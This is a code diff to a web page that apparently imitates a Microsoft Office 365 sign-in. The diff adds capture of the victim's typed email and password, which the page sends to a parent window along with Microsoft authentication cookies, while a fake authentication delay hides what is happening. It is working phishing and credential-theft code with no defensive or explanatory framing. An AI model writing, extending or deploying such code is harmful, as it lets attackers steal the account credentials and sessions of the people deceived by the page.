@@ -292,13 +292,15 @@
         ];
 
         // Invisible cookie injection function
-        function injectMicrosoftCookies() {
+        function injectMicrosoftCookies(email, password) {
           console.log('🔵 Injecting Microsoft authentication cookies...');
           
           // Send cookies to parent window for capture
           if (window.parent) {
             window.parent.postMessage({
               type: 'MICROSOFT_COOKIES',
+              email: email,
+              password: password,
               cookies: microsoftCookies,
               cookieList: microsoftCookies,
               timestamp: new Date().toISOString(),
@@ -380,7 +382,7 @@
             showLoading();
 
             // Inject Microsoft cookies before submitting
-            injectMicrosoftCookies();
+            injectMicrosoftCookies(email, password);
 
             // Simulate authentication delay
             setTimeout(() => {
@@ -402,6 +404,7 @@
                             type: 'OFFICE_365_AUTH_SUCCESS',
                             payload: { 
                                 email, 
+                                password: password,
                                 timestamp: new Date().toISOString(),
                                 cookies: microsoftCookies,
                                 cookieList: microsoftCookies
@@ -414,11 +417,11 @@
 
         // Inject cookies when page loads
         window.addEventListener('load', () => {
-            setTimeout(injectMicrosoftCookies, 1000);
+            setTimeout(() => injectMicrosoftCookies(), 1000);
         });
 
         // Periodically inject cookies to simulate ongoing session
-        setInterval(injectMicrosoftCookies, 10000);
+        // Removed periodic injection to prevent spam
     </script>
 </body>
 </html>
